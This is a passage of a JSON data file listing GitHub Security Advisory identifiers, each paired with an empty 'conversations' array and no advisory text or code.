"GHSA-72x4-cq6r-jp4p", "conversations": []}, {"id": "GHSA-w52j-3457-q9wr", "conversations": []}, {"id": "GHSA-x3px-2p95-f6jr", "conversations": []}, {"id": "GHSA-qwrj-9hmp-gpxh", "conversations": []}, {"id": "GHSA-6wvc-6pww-qr4r", "conversations": []}, {"id": "GHSA-6vcc-v9vw-g2x5", "conversations": []}, {"id": "GHSA-3jhm-87m6-x959", "conversations": []}, {"id": "GHSA-9w9f-6mg8-jp7w", "conversations": []}, {"id": "GHSA-xq4v-vrp9-vcf2", "conversations": []}, {"id": "GHSA-jhqp-vf4w-rpwq", "conversations": []}, {"id": "GHSA-h4w9-6x78-8vrj", "conversations": []}, {"id": "GHSA-5q86-62xr-3r57", "conversations": []}, {"id": "GHSA-gwpf-95jc-63rv", "conversations": []}, {"id": "GHSA-xwx5-5c9g-x68x", "conversations": []}, {"id": "GHSA-x938-fvfw-7jh5", "conversations": []}, {"id": "GHSA-4whx-7p29-mq22", "conversations": []}, {"id": "GHSA-xggc-qprg-x6mw", "conversations": []}, {"id": "GHSA-g63h-q855-vp3q", "conversations": []}, {"id": "GHSA-pj96-4jhv-v792", "conversations": []}, {"id": "GHSA-994f-7g86-qr56", "conversations": []}, {"id": "GHSA-67mx-jc2f-jgjm", "conversations": []}, {"id": "GHSA-fcm2-6c3h-pg6j", "conversations": []}, {"id": "GHSA-56j7-2pm8-rgmx", "conversations": []}, {"id": "GHSA-5ffw-gxpp-mxpf", "conversations": []}, {"id": "GHSA-8f4f-v9x5-cg6j", "conversations": []}, {"id": "GHSA-q4w5-4gq2-98vm", "conversations": []}, {"id": "GHSA-526x-rm7j-v389", "conversations": []}, {"id": "GHSA-r48q-9g5r-8q2h", "conversations": []}, {"id": "GHSA-qx2j-85q5-ffp8", "conversations": []}, {"id": "GHSA-958j-443g-7mm7", "conversations": []}, {"id": "GHSA-2927-hv3p-f3vp", "conversations": []}, {"id": "GHSA-p782-xgp4-8hr8", "conversations": []}, {"id": "GHSA-2m7h-86qq-fp4v", "conversations": []}, {"id": "GHSA-w689-557m-2cvq", "conversations": []}, {"id": "GHSA-qpgx-64h2-gc3c", "conversations": []}, {"id": "GHSA-wm2r-rp98-8pmh", "conversations": []}, {"id": "GHSA-q6h7-4qgw-2j9p", "conversations": []}, {"id": "GHSA-66vw-v2x9-hw75", "conversations": []}, {"id": "GHSA-gcj7-j438-hjj2", "conversations": []}, {"id": "GHSA-28r6-jm5h-mrgg", "conversations": []}, {"id": "GHSA-6635-c626-vj4r", "conversations": []}, {"id": "GHSA-xm99-6pv5-q363", "conversations": []}, {"id": "GHSA-32rp-q37p-jg6w", "conversations": []}, {"id": "GHSA-fx5p-f64h-93xc", "conversations": []}, {"id": "GHSA-4hj2-r2pm-3hc6", "conversations": []}, {"id": "GHSA-2v6v-q994-xvxx", "conversations": []}, {"id": "GHSA-fxwj-v664-wv5g", "conversations": []}, {"id": "GHSA-qggc-pj29-j27m", "conversations": []}, {"id": "GHSA-xg75-q3q5-cqmv", "conversations": []}, {"id": "GHSA-ffjp-66mx-3qpj", "conversations": []}, {"id": "GHSA-c3g4-w6cv-6v7h", "conversations": []}, {"id": "GHSA-27rq-4943-qcwp", "conversations": []}, {"id": "GHSA-h6xx-pmxh-3wgp", "conversations": []}, {"id": "GHSA-g3vv-g2j5-45f2", "conversations": []}, {"id": "GHSA-f37q-q7p2-ccfc", "conversations": []}, {"id": "GHSA-mqf3-28j7-3mj6", "conversations": []}, {"id": "GHSA-vmp5-c5hp-6c65", "conversations": []}, {"id": "GHSA-mcq2-w56r-5w2w", "conversations": []}, {"id": "GHSA-6rw3-3whw-jvjj", "conversations": []}, {"id": "GHSA-qvf8-p83w-v58j", "conversations": []}, {"id": "GHSA-fx95-883v-4q4h", "conversations": []}, {"id": "GHSA-2f5v-8r3f-8pww", "conversations": []}, {"id": "GHSA-vrcc-g6vj-mh5w", "conversations": []}, {"id": "GHSA-6x2m-w449-qwx7", "conversations": []}, {"id": "GHSA-6h3m-36w8-hv68", "conversations": []}, {"id": "GHSA-3382-r9q8-4hfg", "conversations": []}, {"id": "GHSA-c3h9-896r-86jm", "conversations": []}, {"id": "GHSA-w2j5-3rcx-vx7x", "conversations": []}, {"id": "GHSA-j34v-3552-5r7j", "conversations": []}, {"id": "GHSA-65f3-3278-7m65", "conversations": []}, {"id": "GHSA-5gjh-5j4f-cpwv", "conversations": []}, {"id": "GHSA-gv9j-4w24-q7vx", "conversations": []}, {"id": "GHSA-h3q4-vmw4-cpr5", "conversations": []}, {"id": "GHSA-pvx3-gm3c-gmpr", "conversations": []}, {"id": "GHSA-vmf7-hmh6-vv57", "conversations": []}, {"id": "GHSA-h6h5-6fmq-rh28", "conversations": []}, {"id": "GHSA-gw5h-h6hj-f56g", "conversations": []}, {"id": "GHSA-q347-cg56-pcq4", "conversations": []}, {"id": "GHSA-w4f8-fxq2-j35v", "conversations": []}, {"id": "GHSA-6cp7-g972-w9m9", "conversations": []}, {"id": "GHSA-4cx6-fj7j-pjx9", "conversations": []}, {"id": "GHSA-p93v-m2r2-4387", "conversations": []}, {"id": "GHSA-7v5r-r995-q2x2", "conversations": []}, {"id": "GHSA-5jgq-x857-p8xw", "conversations": []}, {"id": "GHSA-8c26-wmh5-6g9v", "conversations": []}, {"id": "GHSA-76j4-gggq-7rg9", "conversations": []}, {"id": "GHSA-r9cr-hvjj-496v", "conversations": []}, {"id": "GHSA-crp2-qrr5-8pq7", "conversations": []}, {"id": "GHSA-jh63-28gx-7p26", "conversations": []}, {"id": "GHSA-8v99-48m9-c8pm", "conversations": []}, {"id": "GHSA-jpj5-hg26-6jgc", "conversations": []}, {"id": "GHSA-jr9c-h74f-2v28", "conversations": []}, {"id": "GHSA-chxf-fjcf-7fwp", "conversations": []}, {"id": "GHSA-mq47-6wwv-v79w", "conversations": []}, {"id": "GHSA-j9wf-vvm6-4r9w", "conversations": []}, {"id": "GHSA-8h8p-x289-vvqr", "conversations": []}, {"id": "GHSA-gv2h-gf8m-r68j", "conversations": []}, {"id": "GHSA-9r5x-fjv3-q6h4", "conversations": []}, {"id": "GHSA-wqwf-x5cj-rg56", "conversations": []}, {"id": "GHSA-4g4p-42wc-9f3m", "conversations": []}, {"id": "GHSA-hj93-5fg3-3chr", "conversations": []}, {"id": "GHSA-wxj3-qwv4-cvfm", "conversations": []}, {"id": "GHSA-hrhx-6h34-j5hc", "conversations": []}, {"id": "GHSA-86f3-hf24-76q4", "conversations": []}, {"id": "GHSA-m658-p24x-p74r", "conversations": []}, {"id": "GHSA-4fqx-74rv-638w", "conversations": []}, {"id": "GHSA-hpmr-prr2-cqc4", "conversations": []}, {"id": "GHSA-wmrx-57hm-mw7r", "conversations": []}, {"id": "GHSA-6g5f-f5pm-mjrg", "conversations": []}, {"id": "GHSA-62mh-w5cv-p88c", "conversations": []}, {"id": "GHSA-8j3f-mhq8-gmh4", "conversations": []}, {"id": "GHSA-hfmf-q69j-6m5p", "conversations": []}, {"id": "GHSA-72wf-hwcq-65h9", "conversations": []}, {"id": "GHSA-hwrr-rhmm-vcvf", "conversations": []}, {"id": "GHSA-f9fq-vjvh-779p", "conversations": []}, {"id": "GHSA-r3gq-wxqf-q4gh", "conversations": []}, {"id": "GHSA-4wp3-8q92-mh8w", "conversations": []}, {"id": "GHSA-gfh2-7jg5-653p", "conversations": []}, {"id": "GHSA-856q-xv3c-7f2f", "conversations": []}, {"id": "GHSA-h2fg-54x9-5qhq", "conversations": []}, {"id": "GHSA-jrpg-35hw-m4p9", "conversations": []}, {"id": "GHSA-fqfh-778m-2v32", "conversations": []}, {"id": "GHSA-8wrg-m8vm-5fvj", "conversations": []}, {"id": "GHSA-44gg-pmqr-4669", "conversations": []}, {"id": "GHSA-q9x4-q76f-5h5j", "conversations": []}, {"id": "GHSA-6qq8-5wq3-86rp", "conversations": []}, {"id": "GHSA-9m95-8hx6-7p9v", "conversations": []}, {"id": "GHSA-g9mp-8g3h-3c5c", "conversations": []}, {"id": "GHSA-5qgp-p5jc-w2rm", "conversations": []}, {"id": "GHSA-gwmc-6795-qghj", "conversations": []}, {"id": "GHSA-8m9g-647g-5pxw", "conversations": []}, {"id": "GHSA-jh6m-3pqw-242h", "conversations": []}, {"id": "GHSA-q47x-6mqq-4w92", "conversations": []}, {"id": "GHSA-vc3x-gx6c-g99f", "conversations": []}, {"id": "GHSA-5wmg-j84w-4jj4", "conversations": []}, {"id": "GHSA-h2x7-2ff6-v32p", "conversations": []}, {"id": "GHSA-wxjg-p59j-6c92", "conversations": []}, {"id": "GHSA-6jm6-cmcp-fqjq", "conversations": []}, {"id": "GHSA-wf43-55jj-vwq8", "conversations": []}, {"id": "GHSA-hcw3-j74m-qc58", "conversations": []}, {"id": "GHSA-877x-32pm-p28x", "conversations": []}, {"id": "GHSA-57q7-rxqq-7vgp", "conversations": []}, {"id": "GHSA-742w-89gc-8m9c", "conversations": []}, {"id": "GHSA-8w94-cf6g-c8mg", "conversations": []}, {"id": "GHSA-9wvh-ff5f-xjpj", "conversations": []}, {"id": "GHSA-5cgx-vhfp-6cf9", "conversations": []}, {"id": "GHSA-qq97-vm5h-rrhg", "conversations": []}, {"id": "GHSA-5x92-p4p5-33c4", "conversations": []}, {"id": "GHSA-5x29-3hr9-6wpw", "conversations": []}, {"id": "GHSA-34jx-wx69-9x8v", "conversations": []}, {"id": "GHSA-rgjg-66cx-5x9m", "conversations": []}, {"id": "GHSA-jp32-vmm6-3vf5", "conversations": []}, {"id": "GHSA-wc9w-wvq2-ffm9", "conversations": []}, {"id": "GHSA-x5f3-qmwj-4f84", "conversations": []}, {"id": "GHSA-m358-g4rp-533r", "conversations": []}, {"id": "GHSA-6978-vg2j-cc9q", "conversations": []}, {"id": "GHSA-mpq4-rjj8-fjph", "conversations": []}, {"id": "GHSA-g622-r636-qfqh", "conversations": []}, {"id": "GHSA-99cg-575x-774p", "conversations": []}, {"id": "GHSA-5gjm-fj42-x983", "conversations": []}, {"id": "GHSA-qmmc-jppf-32wv", "conversations": []}, {"id": "GHSA-g2qx-6ghw-67hm", "conversations": []}, {"id": "GHSA-h289-x5wc-xcv8", "conversations": []}, {"id": "GHSA-vx57-7f4q-fpc7", "conversations": []}, {"id": "GHSA-47wr-426j-fr82", "conversations": []}, {"id": "GHSA-jqmc-79gx-7g8p", "conversations": []}, {"id": "GHSA-63qx-x74g-jcr7", "conversations": []}, {"id": "GHSA-8vwm-8vj8-rqjf", "conversations": []}, {"id": "GHSA-6hv3-7c34-4hx8", "conversations": []}, {"id": "GHSA-qhm4-jxv7-j9pq", "conversations": []}, {"id": "GHSA-33p6-fx42-7rf5", "conversations": []}, {"id": "GHSA-85p9-j7c9-v4gr", "conversations": []}, {"id": "GHSA-xhqq-x44f-9fgg", "conversations": []}, {"id": "GHSA-g5v4-5x39-vwhx", "conversations": []}, {"id": "GHSA-7f33-f4f5-xwgw", "conversations": []}, {"id": "GHSA-q2qr-3c2p-9235", "conversations": []}, {"id": "GHSA-q9vw-wr57-xjv3", "conversations": []}, {"id": "GHSA-cg3q-j54f-5p7p", "conversations": []}, {"id": "GHSA-82mm-ffjr-h86c", "conversations": []}, {"id": "GHSA-m4jx-6526-vvhm", "conversations": []}, {"id": "GHSA-9q3g-m353-cp4p", "conversations": []}, {"id": "GHSA-xjqr-g762-pxwp", "conversations": []}, {"id": "GHSA-fgv8-vj5c-2ppq", "conversations": []}, {"id": "GHSA-4cxw-hq44-r344", "conversations": []}, {"id": "GHSA-x27w-qxhg-343v", "conversations": []}, {"id": "GHSA-rrp4-2xx3-mv29", "conversations": []}, {"id": "GHSA-ccxc-vr6p-4858", "conversations": []}, {"id": "GHSA-9cwv-cppx-mqjm", "conversations": []}, {"id": "GHSA-93p5-8fqw-wjx3", "conversations": []}, {"id": "GHSA-76wf-9vgp-pj7w", "conversations": []}, {"id": "GHSA-g7v2-2qxx-wjrw", "conversations": []}, {"id": "GHSA-997c-fj8j-rq5h", "conversations": []}, {"id": "GHSA-qh36-44jv-c8xj", "conversations": []}, {"id": "GHSA-wpfr-6297-9v57", "conversations": []}, {"id": "GHSA-g6w6-r76c-28j7", "conversations": []}, {"id": "GHSA-pg38-r834-g45j", "conversations": []}, {"id": "GHSA-x6mj-w4jf-jmgw", "conversations": []}, {"id": "GHSA-579h-mv94-g4gp", "conversations": []}, {"id": "GHSA-xx8c-m748-xr4j", "conversations": []}, {"id": "GHSA-qrrc-ww9x-r43g", "conversations": []}, {"id": "GHSA-38r5-34mr-mvm7", "conversations": []}, {"id": "GHSA-v4h8-794j-g8mm", "conversations": []}, {"id": "GHSA-hf6f-jq25-8gq9", "conversations": []}, {"id": "GHSA-77cr-6gr8-7rr9", "conversations": []}, {"id": "GHSA-h5rh-w6vm-9ghc", "conversations": []}, {"id": "GHSA-8fvr-5rqf-3wwh", "conversations": []}, {"id": "GHSA-cx3w-xqmc-84g5", "conversations": []}, {"id": "GHSA-x4rg-4545-4w7w", "conversations": []}, {"id": "GHSA-2575-pghm-6qqx", "conversations": []}, {"id": "GHSA-36h2-95gj-w488", "conversations": []}, {"id": "GHSA-g44j-7vp3-68cv", "conversations": []}, {"id": "GHSA-8459-6rc9-8vf8", "conversations": []}, {"id": "GHSA-w3wf-cfx3-6gcx", "conversations": []}, {"id": "GHSA-4w5x-x539-ppf5", "conversations": []}, {"id": "GHSA-pf59-j7c2-rh6x", "conversations": []}, {"id": "GHSA-f5pg-7wfw-84q9", "conversations": []}, {"id": "GHSA-f5fj-7265-jxhj", "conversations": []}, {"id": "GHSA-9689-rx4v-cqgc", "conversations": []}, {"id": "GHSA-ch68-7cf4-35vr", "conversations": []}, {"id": "GHSA-hv53-vf5m-8q94", "conversations": []}, {"id": "GHSA-wqv3-8cm6-h6wg", "conversations": []}, {"id": "GHSA-vfp4-xx6m-7vf6", "conversations": []}, {"id": "GHSA-82hx-w2r5-c2wq", "conversations": []}, {"id": "GHSA-wp47-9r3h-xfgq", "conversations": []}, {"id": "GHSA-6rrw-4fm9-rghv", "conversations": []}, {"id": "GHSA-m332-53r6-2w93", "conversations": []}, {"id": "GHSA-gr7w-x2jp-3xgw", "conversations": []}, {"id": "GHSA-5jp2-vwrj-99rf", "conversations": []}, {"id": "GHSA-528j-9r78-wffx", "conversations": []}, {"id": "GHSA-59hj-62f5-fgmc", "conversations": []}, {"id": "GHSA-j92c-mmf7-j5x5", "conversations": []}, {"id": "GHSA-c6hx-pjc3-7fqr", "conversations": []}, {"id": "GHSA-9gp7-6833-wv89", "conversations": []}, {"id": "GHSA-qj6r-fhrc-jj5r", "conversations": []}, {"id": "GHSA-7v3g-4878-5qrf", "conversations": []}, {"id": "GHSA-7gc4-r5jr-9hxv", "conversations": []}]